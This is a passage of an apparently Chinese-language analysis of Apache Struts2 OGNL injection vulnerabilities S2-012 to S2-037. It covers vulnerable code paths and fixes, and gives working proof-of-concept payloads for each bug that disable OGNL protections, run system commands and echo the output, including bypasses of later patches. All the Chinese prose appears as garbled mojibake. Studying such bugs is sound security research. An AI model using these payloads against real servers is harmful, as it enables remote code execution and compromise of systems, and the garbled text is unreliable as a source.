Â¶ÇÊûúÂΩìÂâçÂ≠òÂú®Ëøô‰∏™Â±ûÊÄßÁöÑÊó∂ÂÄôÔºåËøîÂõûÂÖ∂ÂÜÖÂÆπ ÂêéÁª≠Â∞±ÊòØË∑ü(1)(2)ËøôÁßçÊâßË°åÁöÑÂéüÁêÜ‰∏ÄÊ†∑Ôºå‰ºö‰ª•(1)‰Ωú‰∏∫nodeË∞ÉÁî®getValue„ÄÇ ËøôÈáåÂ∑ßÂ¶ôÁöÑÂ∞±ÊòØÂà©Áî®ËøôÁßç‰∏≠ËΩ¨ÁöÑÊñπÂºèÔºåËßÑÈÅø‰∫ÜÂèÇÊï∞ÂêçÁöÑÊ≠£ÂàôÊ£ÄÊµã POC123?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&amp;z[(password)(bla)]=1// ÂõûÊòæPOC?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&amp;z[(password)(bla)]=1 ‰øÆÂ§çÊîπËøõ‰∫ÜÊ≠£Âàô Â¢ûÂä†‰∫ÜsetParameterÂáΩÊï∞ÔºåÈªòËÆ§ËÆæÁΩÆË°®ËææÂºè‰∏çÂèØÊâßË°å 7. S2-012ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections. ÁúãÊèèËø∞ÂèØ‰ª•Áü•ÈÅìÊòØstruts2Âú®Â§ÑÁêÜredirectÁöÑÊó∂ÂÄôÂá∫Áé∞ÁöÑÈóÆÈ¢ò„ÄÇ ÁªìÊûúËøîÂõûÂêéÂõûÂéªË∞ÉÁî®ServletRedirectResultÊù•Â§ÑÁêÜ Êù•ÁúãÁúãËØ•ÂØπË±°ÁöÑÂÆûÈôÖÂ§ÑÁêÜÂáΩÊï∞org.apache.struts2.dispatcher.ServletRedirectResult#execute Âú®Áà∂Á±ªexecuteÂáΩÊï∞Ë∞ÉÁî®‰∫ÜconditionalParseÂáΩÊï∞ ËøôÈáåÂá∫Áé∞‰∫ÜÊàë‰ª¨ÊØîËæÉÁÜüÊÇâÁöÑTextParseUtil.translateVariablesÔºåS2-001Â∞±ÊòØÁî±Ëøô‰∏™ÂáΩÊï∞Êù•Â§ÑÁêÜStringÁ±ªÂûãËΩ¨ÂåñÁöÑ„ÄÇ Ê≠§Êó∂param‰∏∫Êàë‰ª¨Âú®struts.xml‰∏≠ÁöÑÈÖçÁΩÆedit.action?skillName=${currentSkill.name} ÂâçÈù¢ÂàÜÊûêËøátranslateVariablesÔºåËøôÈáåÁõ¥Âàá‰∏ªÈ¢ò Âá∫ÈóÆÈ¢òÁöÑÂú∞ÊñπË∑üS2-001‰∏ÄÊ†∑ Ëß¶ÂèëÊÄªÂÖ±ÂàÜ‰∏∫‰∏§Ê≠•Ôºö Â∞ÜxmlÈÖçÁΩÆ‰∏≠${currentSkill.name}Ëß£ÊûêÊàê‰º†ÂÖ•ÁöÑÂÄºÔºåÊ≠§Êó∂stack.findValue‰ºöÂéªÊâæÂà∞ÂâçÈù¢Â§ÑÁêÜÂ•ΩÂêéÁöÑResultÈáåÈù¢ÁöÑcurrentSkill.nameÁöÑÂÄº Áî±‰∫étranslateVariablesÁöÑËß£ÊûêOGNLË°®ËææÂºèÊúâ‰∏§Áßç$„ÄÅ%ÔºåÂπ∂‰∏îÊòØÂæ™ÁéØÂéªÂ§ÑÁêÜÁöÑ È¶ñÂÖàÊòØÂéªÂ§ÑÁêÜ$ÔºåÂ∞Ü${currentSkill.name}Ëß£ÊûêÊàêÂÖ∑‰ΩìÁöÑÂÄºÔºåÂπ∂‰∏îÂ∞ÜresultÁöÑÂÄºÁΩÆ‰∏∫‰ªñÁöÑÂÜÖÂÆπ ËôΩÁÑ∂Â∑≤Áªè‰øÆÂ§ç‰∫ÜÂæ™ÁéØÈÄíÂΩíÊâßË°åÁöÑÈóÆÈ¢ò(s2-001‰ºöÊâßË°å‰∏§Â±Ç${})Ôºå‰ΩÜÊòØÂõ†‰∏∫ËøòÂæ™ÁéØÂéªÂ§ÑÁêÜ%ÔºåÈÇ£‰πà‰ªçÁÑ∂ÂèØ‰ª•ËææÂà∞Âæ™ÁéØÈÄíÂΩíËÆ°ÁÆóÁöÑÊïàÊûú${Âè¶‰∏ÄÂ±Ç‰ª•%Ëµ∑ÂßãÁöÑognlË°®ËææÂºè}ÔºåÊâÄ‰ª•POCÈáåÈù¢ÈúÄË¶ÅÁî®%{}Êù•ÂÜôÂÖ•OGNLË°®ËææÂºè ÊâÄ‰ª•ÂØπ‰∫éS2-012Êù•ËØ¥ÔºåÈÖçÁΩÆ‰∏≠${currentSkill.name}ÊòØËá≥ÂÖ≥ÈáçË¶ÅÁöÑ ‰øÆÂ§çÁî±‰∫éÊàëÂâçÈù¢ÂàÜÊûêÁöÑÊòØ2.2.3ÁâàÊú¨ÔºåÂêéÁª≠ÁöÑÁâàÊú¨ÁöÑtranslateVariablesÂèòÂåñÊúâÁÇπÂ§ßÔºåÂÖ∂‰øÆÂ§çÁâàÊú¨ Â¢ûÂä†‰∫ÜposÊù•ÂÅöËµ∑Âßã‰ΩçÁΩÆÊù•Êü•Êâæ${}%{}ÔºåÂú®Á¨¨‰∏ÄÊ¨°Ë°®ËææÂºèÊâßË°åÂÆåÊàêÂêé‰ºöÊõ¥Êñ∞posÂÄºÔºåÊù•Èò≤Ê≠¢‰∫åÊ¨°OGNLË°®ËææÂºèÊâßË°å POC123currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;// ÂõûÊòæPOC%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125; 8. S2-013/S2-014ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.14.1 ËøôÊ¨°ÁöÑÂéüÁêÜË∑üS2-001Á±ª‰ººÔºåÂè™ÊòØÈóÆÈ¢òÂá∫Âú®Ëß£Êûê&lt;s:a&gt;„ÄÅ&lt;s:url&gt;ÔºåÂΩìËøô‰∏§‰∏™Ê†áÁ≠æÊîØÊåÅincludeParams ÂΩìÂΩìÂâçÁöÑhref‰∏∫Á©∫Êó∂Ôºå‰ºöÁî®ÂΩìÂâçurlÊù•Â°´ÂÖÖhrefÔºå‰πüÂ∞±ÊòØÂú®buildUrlÊó∂ÂØºËá¥ÁöÑOGNLË°®ËææÂºèÁöÑÊâßË°å ËøôÈáå‰∏çÂÖ∑‰ΩìÂàÜÊûê‰∫ÜÔºåÁúã‰∏Ä‰∏ã‰ªñÁöÑÊâßË°åÊ†à org.apache.struts2.views.util.DefaultUrlHelper#translateVariable ‰πüÂêåÊ†∑ÊòØ‰ΩøÁî®StringËΩ¨Êç¢Êó∂Âá∫Áé∞ÁöÑOGNLË°®ËææÂºèÊâßË°å POC123?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&#125;// ÂõûÊòæPOC?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&#125; ‰øÆÂ§ç ËøôÈáåorg.apache.struts2.views.util.DefaultUrlHelper‰∏çÂÜç‰ΩøÁî®TextParseUtilÊù•Â§ÑÁêÜ 9. S2-015ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.14.2 S2-015‰∏ÄÂÖ±Êúâ‰∏§ÁßçÔºö Á¨¨‰∏ÄÁßçÊºèÊ¥ûÂéüÁêÜË∑üS2-012Á±ª‰ººÔºåËøôÊ¨°ÈóÆÈ¢ò‰∏çÊòØÂá∫Âú®ÈáçÂÆöÂêëÔºåËÄåÊòØÂú®Ëß£ÊûêÂÖ∑‰ΩìÁöÑaction nameÊó∂Âá∫Áé∞ÁöÑÈóÆÈ¢ò ËøôÈáåÁöÑ{1}‰ºöË¢´ÊõøÊç¢Êàêxxx.actionÁöÑxxxÔºåËøôÈáåÁöÑxxxÂ¶ÇÊûúË¢´Êàë‰ª¨ÊõøÊç¢ÊàêOGNLË°®ËææÂºèÔºå‰ºöÂú®ÂêéÁª≠ÁöÑTextParseUtil.translateVariablesÂæóÂà∞ÊâßË°åÔºåËøáÁ®ãË∑üS2-012‰∏ÄÊ†∑Ôºå‰∏çÂÜçÂèôËø∞„ÄÇ Á¨¨‰∫åÁßçÊòØÁªìÊûúÁî±httpheaderÊù•Â§ÑÁêÜÊó∂Ôºå‰ºöÂ∞ÜÊàë‰ª¨ÁöÑ${message}ÂµåÂ•óÊâßË°å org.apache.struts2.dispatcher.HttpHeaderResult#execute Ë∑üS2-012‰∏ÄÊ†∑ÔºåËß£ÊûêÊâßË°å${Âè¶‰∏ÄÂ±Ç‰ª•%Ëµ∑ÂßãÁöÑOGNLË°®ËææÂºè} POC1234// ÊëòËá™https://www.freebuf.com/vuls/217482.html%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action// Á¨¨‰∫åÁßçÔºümessage=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; ËøôÈáåÊØîËæÉÁâπÊÆäÁöÑÊòØËøôÈáåÂØπÂéüÊúâ#_memberAccess[&#39;allowStaticMethodAccess&#39;]=trueÔºåÊîπÊàê‰∫Ü 1234567// ÂéüÊù•ÁöÑÊñπÂºè#_memberAccess['allowStaticMethodAccess']=true// ÈÄöËøáÂèçÂ∞ÑÊú∫Âà∂Êù•ËÆæÁΩÆ#_memberAccess['allowStaticMethodAccess']#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true) ‰∏∫‰ªÄ‰πàË¶ÅÈÄöËøáËøôÁßçÊñπÂºèÊù•ÂÜôÂÖ•Âë¢Ôºü ÂÖàÊù•ÁúãOGNLÊòØÊÄé‰πàsetValueÁöÑ ognl.OgnlRuntime#setFieldValue ËÄåÊ≠§Êó∂ËøôÈáåÊàë‰ª¨Ë¶ÅËÆæÁΩÆÁöÑ#_memberAccess[&#39;allowStaticMethodAccess&#39;] ÊòØfinalÁ±ªÂûãÔºåÊàë‰ª¨‰∏çËÉΩ‰ΩøÁî®ÊôÆÈÄöÁöÑÊñπÂºèÊîπÂèò‰ªñÁöÑÂÄºÔºåÂè™ËÉΩÈÄöËøá‰∏äÈù¢ÁöÑÂèçÂ∞ÑÁöÑÊñπÂºèÊù•ËøõË°å‰øÆÊîπ„ÄÇ ËøôÈáåÁöÑÊîπÂèòÊòØ‰ªéstruts2 2.3.14.1ÁâàÊú¨ÂºÄÂßãÁöÑÔºåÊÑèÂë≥ÁùÄÈ´ò‰∫éËøô‰∏™ÁâàÊú¨ÁöÑ‰ª•ÂêéÁöÑpocÂè™ËÉΩÈÄöËøáËøôÁßçÊñπÂºèÊù•ËÆæÁΩÆ Èô§‰∫Ü‰∏äÈù¢ÈÄöËøáÂèçÂ∞ÑÊú∫Âà∂Êù•ËøõË°åÁªïËøáÔºåÊàë‰ª¨‰πüÂèØ‰ª•Áõ¥Êé•Áî®ÊûÑÈÄ†Âô®ÁöÑÊñπÊ≥ïÊù•ÊâßË°åÔºåÊØîÂ¶Çnew ProccessBuilder(&#39;id&#39;).start() ‰øÆÂ§çËøôÈáåÁöÑ‰øÆÂ§çÂ∞±ÊòØS2-012ÁöÑ‰øÆÂ§çÔºå‰∏ªË¶Å‰øÆÂ§ç‰∫ÜÊâßË°åËøôÁßçOGNLË°®ËææÂºè${Âè¶‰∏ÄÂ±Ç%Ëµ∑ÂßãÁöÑOGNLË°®ËææÂºè} 10. S2-016ËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.15 S2-016ÈóÆÈ¢òÂá∫Âú®Â§ÑÁêÜÈªòËÆ§ÁöÑaction:xxxÊàñredirect:xxxÔºåÂêéÈù¢Ë∑üÁöÑxxx‰∏∫OGNLË°®ËææÂºèÔºåStruts2ÈªòËÆ§Â∞ÜÁî®ServletRedirectResultÊù•Â§ÑÁêÜË∑≥ËΩ¨ÈóÆÈ¢òÔºåËøôÈáåË∑üS2-012‰∏ÄÊ†∑ÔºåÂè™ÊòØËøôÈáåÁöÑË∑≥ËΩ¨ËÆæÁΩÆÂú®urlÈáåÈù¢ ÊâßË°åÈìæË∑ØË∑üS2-012‰∏ÄÊ†∑Ôºå‰∏ç‰ΩúÂàÜÊûê‰∫Ü POC1redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; ‰øÆÂ§çorg.apache.struts2.dispatcher.mapper.DefaultActionMapperÈªòËÆ§ÁöÑredirect/redirectactionÁõ¥Êé•Ë¢´Âà†Èô§‰∫Ü action:ÈÉ®ÂàÜÂõ†‰∏∫S2-015ÁöÑÂÖ≥Á≥ªÔºåÈôêÂà∂‰∫ÜactionÂêç Â∑≤Áªè‰∏çÊûÑÊàêÂ®ÅËÉÅ‰∫Ü 11. S2-019ËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.15.1 S2-019Ë∑üS2-008ÁöÑÁ¨¨‰∫å‰∏™ÊºèÊ¥û‰∏ÄÊ†∑ÔºåÂΩìÂºÄÂêØÂºÄÂèëËÄÖÊ®°ÂºèÊó∂ÔºåÂÖÅËÆ∏‰ΩøÁî®commandÁöÑÊ®°ÂºèÊù•ÊâßË°åOGNLË°®ËææÂºè ÂÖ∑‰ΩìÁúãS2-008 POC1?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close()) ‰øÆÂ§çËøôÈáåÂêéÈù¢ÁöÑÂá†‰∏™ÁâàÊú¨ÈÉΩÊòØÂÖÅËÆ∏ÊâßË°åÁöÑÔºåÂºÄÂèëËÄÖÊ®°Âºè‰∏ãÁöÑcommandÂπ∂Ê≤°ÊúâË¢´ÂèñÊ∂àÊéâÔºåÊâÄ‰ª•Â¶ÇÊûúÂú®Á∫ø‰∏äÁéØÂ¢ÉÁ¢∞Âà∞debugÊ®°ÂºèÔºåÈÇ£Â∞±ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ãOGNLË°®ËææÂºèÁöÑÊâßË°å ‰ΩÜÊòØÁî±‰∫é‰ªéstruts2 2.3.20‰πãÂêéÂºïÂÖ•‰∫ÜÈªëÂêçÂçïÊ®°ÂºèÔºàexcludedClasses, excludedPackageNames Âíå excludedPackageNamePatternsÔºâÔºåÂπ∂‰∏î‰ΩøÁî®ÊûÑÈÄ†ÂáΩÊï∞ÁöÑÊñπÂºè‰πüÂ§±Êïà‰∫Ü ËøôÈáåÂâçËæà‰ª¨Áî®Âà∞‰∫ÜÂ∞ÜSecurityMemberAccessÂàùÂßãÂåñÁöÑÊñπÂºèÊù•ÁªïËøáËøô‰∏™ÈôêÂà∂ÔºåÂéüÁêÜÂèØ‰ª•Â•ΩÂ•ΩÁúãÁúãËøôÁØáÊñáÁ´†https://paper.seebug.org/794/#33-struts-2329„ÄÇ 1debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app'))) ÂêéÁª≠ËøòÊúâ‰∏Ä‰∫õÁªïËøáÔºåÂêéÈù¢ÂÜçËÆ≤ 12. S2-029/S2-036S2-029ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3) S2-036ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.0.0 - Struts 2.3.28.1 ÔºàË∑üS2-029‰∏ÄÊ†∑Ôºå‰∏ªË¶ÅÂú®‰øÆÂ§çÁöÑÂú∞ÊñπËÆ≤Ôºâ ÂéüÁêÜË∑üS2-001Â∑Æ‰∏çÂ§öÔºåS2-029ÁöÑËß¶ÂèëÈúÄË¶ÅjspÁî®Âà∞Ê†áÁ≠æ&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;ÔºånameÂ±ûÊÄß‰∏≠Áî±‰∏ÄOGNLË°®ËææÂºèËß£ÊûêËÄåÂæóÔºåÊÑèÂë≥ÁùÄÁîüÊàêÁöÑinputÊ†áÁ≠æÁöÑnameÂ±ûÊÄßÊòØÂä®ÊÄÅËÆ°ÁÆóËÄåÂæóÁöÑÔºåÊØîÂ¶Ç?xxxx=usernameÔºåÊ≠§Êó∂Ëß£ÊûêÂæóÂà∞ÁöÑinput.name‰∏∫username„ÄÇËøôÂÖ∂‰∏≠ÊâßË°å‰∫Ü%{xxxx}ÔºåËé∑ÂæóxxxxÁöÑÂÜÖÂÆπ„ÄÇËÄåS2-001ÁöÑ‰øÆÂ§ç‰∏ªË¶ÅËß£ÂÜ≥ÁöÑÊòØÈÄíÂΩíËÆ°ÁÆóOGNLË°®ËææÂºèÁöÑÈóÆÈ¢òÔºåS2-029Â∞±ÊòØÂú®ËøõÂÖ•translateVariables‰πãÂâçÂ∞±Â∞ÜÁ¨¨‰∏ÄÂ±ÇÁöÑOGNLË°®ËææÂºèÊâßË°åÂÆåÊØï Áõ¥Êé•ÁúãUIBean.evaluateParams È¶ñÂÖàËÆ°ÁÆó%{message}Âà∞Êàë‰ª¨‰º†ÂÖ•ÁöÑOGNLË°®ËææÂºè ÂêéÁª≠‰ºöÂú®Êàë‰ª¨‰º†ÂÖ•ÁöÑOGNLË°®ËææÂºèÊã¨‰∏ä%{xxx} Ê≠§Êó∂ÂÜç‰º†ÂÖ•Âà∞findValueÂ∞±ÊòØÁ¨¨‰∫åÂ±ÇÁöÑOGNLË°®ËææÂºèÔºåÂêéÁª≠Ë∑üS2-001‰∏ÄÊ†∑ÔºåÂè™ÈúÄË¶ÅÊâßË°å‰∏ÄÊ¨°OGNLË°®ËææÂºèËÆ°ÁÆóÂç≥ÂèØ POC123456// ÈúÄË¶ÅÂÖàÂàùÂßãÂåñSecurityMemberAccessÔºå‰∏çÁÑ∂Êó†Ê≥ïÊâßË°å?message=((%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))// ÂõûÊòæPOC?message=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23ret=@java.lang.Runtime@getRuntime().exec('id')),%23q=@org.apache.commons.io.IOUtils@toString(%23ret.getInputStream()) // S2-036 ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream())) ‰øÆÂ§çS2-029com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute Âú®ËÆ°ÁÆóË°®ËææÂºè‰πãÂâçÔºåÈ™åËØÅÊòØÂê¶ÂèØ‰ª•ÊâßË°å ËøôÈáåÂÖàÁúãnode.isEvalChainÔºåËøôÈáåÊòØÂØπS2-009ÂÅöÁöÑÈôêÂà∂Ôºå‰πüÂ∞±ÊòØÂΩìÂá∫Áé∞((1)(2))Êó∂Ôºå‰ºöËß£ÊûêÂá∫ASTEvalËäÇÁÇπÔºåËÄåASTEvalÂØπË±°ÁöÑisEvalChainÂáΩÊï∞Áõ¥Êé•ËøîÂõûtrueÔºå‰πüÂ∞±‰ΩøÂæó(1)(2)Êó†Ê≥ïÊâßË°å ÂÖ∂Ê¨°ÂÜçÊù•Áúãnode.isSequenceÔºåËøôÈáåÊòØÂØπÂΩ¢Â¶Ç(xxx1,xxx2,xxx3)ÁöÑOGNLË°®ËææÂºèÁöÑÈôêÂà∂Ôºå‰ªñÂ∞ÜËß£ÊûêÂá∫ASTSequenceËäÇÁÇπÔºåASTSequenceÂØπË±°ÁöÑisSequenceÁõ¥Êé•ËøîÂõûtrueÔºå‰πüÂ∞±ÈôêÂà∂‰∫ÜËøôÁßçË°®ËææÂºèÁöÑÊâßË°å ÁÑ∂ÂêéÊØîËæÉÊúâÊÑèÊÄùÁöÑÊòØÔºåÂØπ‰∫éÂΩ¢Â¶Ç((xxx1).(xxx2).(xxx3))ÁöÑOGNLË°®ËææÂºèÔºåËøôÊòØ‰∏ÄÁßçASTChainÔºå‰ΩÜÂÖ∂‰∏≠Âπ∂‰∏ç‰ºöËß£ÊûêÂá∫ASTEval ÁúãÂâçÈù¢ÁöÑÂàÜÊûêÔºåÁü•ÈÅìÂèØ‰ª•Â∞ÜS2-029ÁöÑ‰øÆÂ§çbypassÊéâÔºå‰πüÂ∞±ÊòØS2-036ÁöÑÈóÆÈ¢ò 13. S2-032/S2-033/S2-037ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) ËøôÈáåÊàëÁöÑÁéØÂ¢ÉÊê≠ÁöÑÊòØrest-showcaseÁöÑÔºåÊâÄ‰ª•‰∏ªË¶ÅËÆ≤S2-033ÔºàS2-032ÁöÑÂéüÁêÜË∑ü‰ªñÂ∑Æ‰∏çÂ§öÔºåÂè™ÊòØËß¶ÂèëÂèòÊàê‰∫Ümethod:#_xxxx) rest-pluginÊîØÊåÅËß£Êûêxxx!methodÁöÑË∞ÉÁî® org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocationËß£Êûêname!methodÔºåÂπ∂ÂØπÂΩìÂâçÁöÑrestactionmapperËÆæÁΩÆÂ•ΩÂêéÁª≠Ë¶ÅË∞ÉÁî®method Âú®struts2ÁöÑÊâÄÊúâintercepterË∞ÉÁî®ÂÆåÊØïÂêéÔºå‰ºöÂéªË∞ÉÁî®DefaultActionInvocationÁöÑinvokeActionOnlyÂáΩÊï∞ ËÄåinvokeActionOnly‰ºöÂéªË∞ÉÁî®com.opensymphony.xwork2.DefaultActionInvocation#invokeAction Âú®Ëøô‰∏™ÂáΩÊï∞ÈáåÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰ªñÂ∞ÜÂâçÈù¢ÂèØÊéßÁöÑmethodNameÊîæËøõ‰∫ÜognlUtil.getValueÔºåÂØºËá¥‰∫ÜOGNLË°®ËææÂºèÁöÑÊâßË°å ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂú®ÂâçÈù¢Ë∞ÉÁî®ÁöÑinterceptorÈáå‰∏çËÉΩÂá∫Áé∞ÂºÇÂ∏∏ÁöÑÊÉÖÂÜµÔºå‰ºöÂØºËá¥Êó†Ê≥ïÊâßË°åÂà∞OGNLË°®ËææÂºèÊâßË°åÁöÑ‰ΩçÁΩÆ„ÄÇËøô‰πüÂ∞±ÊòØ‰∏∫‰ªÄ‰πà‰∏çËÉΩÂú®ÂºÄÂêØdevModeÁöÑÊÉÖÂÜµ‰∏ãËøõË°åÂà©Áî®ÁöÑÂéüÂõ†„ÄÇ POC1234http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig// S2-037http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig ËøôÈáåÊàë‰ª¨ÊâßË°åÁöÑÂëΩ‰ª§Áî®#parameters.command[0]ÁöÑÊñπÂºèÊù•Ëé∑ÂèñÔºåËøôÊòØÂõ†‰∏∫Âú®ÁîüÊàêDefaultActionProxyÁöÑÊó∂ÂÄôÂØπmethodNameÂÅö‰∫ÜËΩ¨‰πâÂ§ÑÁêÜÔºå‰∏∫‰∫ÜÈÅøÂÖçËΩ¨‰πâÁ†¥ÂùèOGNLË°®ËææÂºèÔºåÁî®#parametersÁöÑÊñπÂºè‰ªéÂèÇÊï∞‰∏≠Ëé∑Âèñ„ÄÇ ËøòÊúâ‰∏Ä‰∏™ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂú∞ÊñπÊòØÔºåÂú®ÊúÄÂêéË∞ÉÁî®ognlUtil.getValueÊó∂ÔºåÂú®methodNameÂêéÈù¢ÊãºÊé•‰∫Ü()ÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜËøô‰∏™()ÂÅöÂ§ÑÁêÜÔºåÊØîÂ¶ÇËøôÈáåÁöÑPOCÂÅöÁöÑÂ§ÑÁêÜÊòØ#xx.toStringÂéªÂêÉÊéâËøô‰∏™() S2-032/S2-033‰øÆÂ§ç xwork-core:2.3.28.1Âú®OgnlUtil.isEvalExpressionÂ¢ûÂä†‰∫ÜisSequenceÁöÑÂà§Êñ≠ ËøôÈáåÂá∫Áé∞‰∫ÜÊñ∞ÁöÑ‰∏ÄÁßçÂà©Áî®ÊñπÂºè(1)?(2):(3)ÔºåËøôÁßçÂΩ¢ÂºèÁöÑOGNLË°®ËææÂºèÂ∞ÜÊúâASTTestÂØπË±°Êù•Â§ÑÁêÜ ËÄåisEvalChain()ÂíåisSequence()ÈôêÂà∂ÁöÑÊòØASTEvalÂíåASTSequenceÂØπË±°ÔºåËøôÈáåÂπ∂Ê≤°ÊúâÂØπASTTestÂÅöÈôêÂà∂ÔºåÂπ∂‰∏îÁî±‰∫éisSequenceÂπ∂‰∏çÊòØÈÄíÂΩíÂéªÂà§Êñ≠ÁöÑÔºåÊâÄ‰ª•Âú®ASTTestÁöÑchildrenËäÇÁÇπ‰∏äÂÜçÂá∫Áé∞ASTSequence‰πüÊòØokÁöÑ Ê†πÊçÆËøô‰∏™ÂéüÁêÜÔºåÊàë‰ª¨ÂèØ‰ª•ÂÜôÂá∫Êñ∞ÁöÑPOC 1(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json S2-037‰øÆÂ§ç Âú®Ëß£Êûêname!methodÁöÑÂú∞ÊñπÔºåË∞ÉÁî®‰∫ÜcleanupActionName 